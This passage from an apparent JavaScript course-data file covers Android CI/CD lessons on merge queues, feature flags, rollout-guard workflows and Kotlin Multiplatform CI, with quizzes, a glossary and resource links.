<h2>Other scale techniques</h2>
<ul>
  <li><strong>Affected-module builds and tests</strong> on PRs, with everything running on <code>main</code>.</li>
  <li><strong>Build health dashboards</strong>: slowest tasks, cache misses and flaky tests per module.</li>
  <li><strong>Module ownership</strong> (CODEOWNERS) so failures are routed to the right team.</li>
  <li><strong>Convention plugins</strong> (<code>build-logic</code>) to keep hundreds of build files consistent.</li>
</ul>
`,
          tasks: [
            "Read the build-logic convention plugins in the Now in Android repo.",
            "Add the merge_group trigger and try GitHub's merge queue on a test repo.",
            "Explain to a colleague when Bazel would (and wouldn't) be worth it.",
          ],
          quiz: {
            q: "What problem does a merge queue solve?",
            options: [
              "Slow code reviews",
              "PRs that pass individually but break main when merged together",
              "Large APK size",
              "Missing secrets",
            ],
            answer: 1,
            explain: "The queue tests PRs in the order they'll land, so the combination is verified before it reaches main.",
          },
        },
        {
          id: "release-health",
          title: "Feature flags & release health monitoring",
          minutes: 25,
          summary: "Ship code safely: hide unfinished features behind flags, and stop bad rollouts automatically using crash data.",
          body: `
<h2>Decouple deploy from release</h2>
<p>With <strong>feature flags</strong>, code can be merged and shipped while the feature stays off. You turn it on remotely for 1%, 10%, then 100% of users, with no new app release needed. This enables <strong>trunk-based development</strong>: short-lived branches, merging to <code>main</code> daily, and no giant long-running feature branches.</p>
<div class="code-block" data-lang="kotlin" data-label="Kotlin (Firebase Remote Config)">val remoteConfig = Firebase.remoteConfig
remoteConfig.setDefaultsAsync(mapOf("new_checkout_enabled" to false))
remoteConfig.fetchAndActivate()

if (remoteConfig.getBoolean("new_checkout_enabled")) {
    showNewCheckout()
} else {
    showOldCheckout()
}</div>
<div class="callout warn">Flags are technical debt. Remove each flag (and the old code path) once the feature is fully rolled out.</div>

<h2>Watch the release after it ships</h2>
<p>Your pipeline doesn't end at upload. After a staged rollout starts, watch:</p>
<ul>
  <li><strong>Crash-free users</strong> (Firebase Crashlytics)</li>
  <li><strong>ANR and crash rates</strong> in <strong>Play Console → Android vitals</strong>. Google penalizes apps above the bad-behavior thresholds.</li>
  <li>Key business metrics such as logins and purchases.</li>
</ul>

<h2>Automate the safety net</h2>
<p>A scheduled workflow checks crash data during a rollout and halts the release if it crosses a threshold:</p>
<div class="code-block" data-lang="yaml" data-label=".github/workflows/rollout-guard.yml">name: Rollout guard
on:
  schedule:
    - cron: '0 * * * *'      # every hour
  workflow_dispatch:

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Check crash rate
        id: health
        env:
          CRASH_API_KEY: \${{ secrets.CRASH_API_KEY }}
        run: ./scripts/check-crash-rate.sh   # your script: sets "healthy=true/false" in $GITHUB_OUTPUT

      - name: Halt rollout
        if: steps.health.outputs.healthy == 'false'
        uses: r0adkll/upload-google-play@v1
        with:
          serviceAccountJsonPlainText: \${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}
          packageName: com.example.myapp
          track: production
          status: halted</div>
<p>The flow: increase the rollout only when healthy (5% → 20% → 50% → 100%), and halt plus alert the team when not. The fix is often a <strong>feature flag switched off</strong>, which is faster than any hotfix release.</p>
`,
          tasks: [
            "Put one new feature behind a Remote Config flag.",
            "Look at Android vitals (or Crashlytics) for your app and note your crash-free rate.",
            "Write down your rollout plan: steps, thresholds, and who gets alerted.",
          ],
          quiz: {
            q: "What's the fastest way to disable a broken feature for users already on the new version?",
            options: [
              "Publish a hotfix and wait for users to update",
              "Turn off its feature flag remotely",
              "Delete the app from Play",
              "Revert the Git commit",
            ],
            answer: 1,
            explain: "A remote flag change takes effect in minutes. App updates take days to reach most users.",
          },
        },
        {
          id: "kmp-ci",
          title: "CI for Kotlin Multiplatform",
          minutes: 25,
          summary: "Sharing code between Android and iOS means your pipeline must build and test on both Linux and macOS.",
          body: `
<h2>What changes with KMP</h2>
<ul>
  <li>iOS targets <strong>require macOS runners</strong>, which cost about 10× more per minute than Linux on GitHub.</li>
  <li>Kotlin/Native downloads a large toolchain into <code>~/.konan</code>, which should be cached.</li>
  <li>Shared code has tests that run on each platform: <code>jvmTest</code>, <code>testDebugUnitTest</code>, <code>iosSimulatorArm64Test</code>.</li>
</ul>

<h2>Split work by OS to save money</h2>
<div class="code-block" data-lang="yaml" data-label=".github/workflows/kmp.yml">jobs:
  android-and-shared:
    runs-on: ubuntu-latest          # cheap: most of the work happens here
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: 17 }
      - uses: gradle/actions/setup-gradle@v4
      - run: ./gradlew :shared:jvmTest :shared:testDebugUnitTest :androidApp:assembleDebug

  ios:
    runs-on: macos-latest           # expensive: only what needs macOS
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: 17 }
      - uses: gradle/actions/setup-gradle@v4
      - uses: actions/cache@v4
        with:
          path: ~/.konan
          key: konan-\${{ runner.os }}-\${{ hashFiles('gradle/libs.versions.toml') }}
      - run: ./gradlew :shared:iosSimulatorArm64Test</div>

<h2>Tips</h2>
<ul>
  <li>Run the macOS job only when shared or iOS code changes (<code>paths:</code> filters), or only on <code>main</code>.</li>
  <li>Put most logic in <code>commonTest</code> so it's verified on the cheap JVM job.</li>
  <li>Building the actual iOS app (Xcode, signing, TestFlight) is its own topic, and that's where Fastlane shines.</li>
</ul>
<div class="callout tip">🏆 <strong>You've finished the whole path.</strong> You know the core of Android CI/CD and the major specializations. From here, real projects are the teacher: build pipelines, break them, fix them, and share what you learn.</div>
`,
          tasks: [
            "Create a KMP sample project (kmp.jetbrains.com wizard) and push it to GitHub.",
            "Add separate Linux and macOS jobs, and cache ~/.konan.",
            "Compare the minutes used by each job.",
          ],
          quiz: {
            q: "Why split KMP CI into Linux and macOS jobs?",
            options: [
              "Linux can't run Gradle",
              "macOS minutes are much more expensive, so only iOS-specific work should run there",
              "GitHub requires two jobs",
              "It makes the APK smaller",
            ],
            answer: 1,
            explain: "Run shared and Android work on cheap Linux runners and use macOS only where it's required.",
          },
        },
      ],
    },
  ],

  glossary: [
    ["Action", "A reusable unit of a workflow step, such as actions/checkout."],
    ["Artifact", "A file produced by a run and stored for download (an APK, AAB or report)."],
    ["AAB", "Android App Bundle, the publishing format required by Google Play."],
    ["AGP", "Android Gradle Plugin, which builds Android apps with Gradle."],
    ["Build cache", "Reuses the outputs of tasks whose inputs haven't changed."],
    ["Configuration cache", "Gradle feature that caches the result of the configuration phase."],
    ["Composite action", "A custom action made from several steps, used to share setup."],
    ["Environment", "A GitHub deployment target that can require approvals and hold its own secrets."],
    ["Flaky test", "A test that sometimes passes and sometimes fails without code changes."],
    ["GMD", "Gradle Managed Devices: emulators defined and run by Gradle."],
    ["Job", "A set of steps that runs on one runner. Jobs run in parallel by default."],
    ["Matrix", "Running one job several times with different variables."],
    ["OIDC", "Short-lived identity tokens that replace long-lived cloud keys."],
    ["Runner", "The machine (VM) that executes a job."],
    ["Secret", "An encrypted value (password, key) that's available to workflows and masked in logs."],
    ["Staged rollout", "Releasing to a percentage of users first, then increasing."],
    ["Trigger", "The event that starts a workflow (push, pull_request, tag, schedule, manual)."],
    ["Workflow", "A YAML file in .github/workflows describing an automated process."],
    ["Device farm", "A cloud service with real phones for running tests (Firebase Test Lab, BrowserStack)."],
    ["Develocity", "Gradle's commercial platform for build scans, remote caching and test acceleration."],
    ["Fastlane", "A tool that automates building, testing and publishing mobile apps through 'lanes'."],
    ["Feature flag", "A remote switch that turns a feature on or off without a new release."],
    ["Golden image", "An approved reference screenshot used by screenshot tests."],
    ["KMP", "Kotlin Multiplatform: sharing Kotlin code between Android, iOS and other platforms."],
    ["Merge queue", "Tests PRs together, in merge order, before they land on main."],
    ["Self-hosted runner", "A CI machine you manage yourself instead of using hosted runners."],
    ["Sharding", "Splitting a test suite into parts that run in parallel."],
    ["Trunk-based development", "Everyone merges small changes to main frequently, often behind feature flags."],
  ].sort((a, b) => a[0].localeCompare(b[0])),

  resources: [
    ["GitHub Actions docs", "https://docs.github.com/actions"],
    ["Android: Testing on CI", "https://developer.android.com/training/testing/continuous-integration"],
    ["Gradle: setup-gradle action", "https://github.com/gradle/actions"],
    ["Android Emulator Runner", "https://github.com/ReactiveCircus/android-emulator-runner"],
    ["Gradle build performance", "https://docs.gradle.org/current/userguide/performance.html"],
    ["Security hardening for GitHub Actions", "https://docs.github.com/actions/security-guides/security-hardening-for-github-actions"],
    ["Firebase App Distribution (Gradle)", "https://firebase.google.com/docs/app-distribution/android/distribute-gradle"],
    ["Now in Android (real-world CI example)", "https://github.com/android/nowinandroid/tree/main/.github/workflows"],
    ["GitLab CI/CD docs", "https://docs.gitlab.com/ci/"],
    ["Self-hosted runners (GitHub)", "https://docs.github.com/actions/hosting-your-own-runners"],
    ["Fastlane for Android", "https://docs.fastlane.tools/getting-started/android/setup/"],
    ["Firebase Test Lab", "https://firebase.google.com/docs/test-lab/android/command-line"],
    ["Roborazzi", "https://github.com/takahirom/roborazzi"],
    ["GitHub merge queue", "https://docs.github.com/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges/managing-a-merge-queue"],
    ["Firebase Remote Config", "https://firebase.google.com/docs/remote-config"],
    ["Kotlin Multiplatform", "https://www.jetbrains.com/help/kotlin-multiplatform-dev/get-started.html"],
  ],
};
